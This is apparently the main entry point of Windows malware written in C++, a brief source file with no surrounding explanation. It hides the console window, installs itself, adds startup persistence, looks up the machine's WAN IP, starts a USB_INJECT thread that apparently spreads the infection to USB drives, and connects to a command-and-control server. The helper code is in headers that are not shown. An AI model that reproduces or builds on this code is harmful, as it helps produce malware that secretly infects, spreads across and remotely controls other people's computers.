//#include "pch.h"
#include "supercharge.hpp"
#include "install.hpp"

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	supercharge bv;
	Install();
	bv.startup();
	bv.Wanip();
	bv.hThread = CreateThread(NULL, 0, USB_INJECT, NULL, 0, NULL);
	bv.C2Connect();
	return 0;
}
